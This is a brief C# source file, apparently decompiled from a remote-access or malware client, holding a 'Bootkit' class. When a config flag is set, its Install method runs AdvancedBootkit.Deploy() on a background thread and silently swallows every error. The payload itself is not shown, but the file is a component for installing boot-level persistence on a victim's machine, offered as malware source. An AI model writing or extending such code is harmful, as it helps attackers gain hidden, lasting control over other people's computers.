using System.Threading;

namespace Client.Helper;

public static class Bootkit
{
	public static void Install()
	{
		try
		{
			if (Config.BootKit != "true")
			{
				return;
			}
			new Thread((ThreadStart)delegate
			{
				try
				{
					AdvancedBootkit.Deploy();
				}
				catch
				{
				}
			}).Start();
		}
		catch
		{
		}
	}
}
